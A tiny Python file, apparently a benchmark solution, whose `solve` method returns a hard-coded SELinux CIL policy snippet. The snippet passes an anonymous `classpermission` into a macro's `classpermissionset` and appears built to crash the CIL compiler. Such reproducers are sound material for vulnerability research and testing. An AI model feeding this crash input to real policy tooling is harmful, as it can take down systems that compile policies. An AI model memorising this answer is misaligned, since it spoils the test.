class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'(class a (p))(macro m (x)(classpermissionset s $x))(macrocall m (classpermission (a (p))))'
        return poc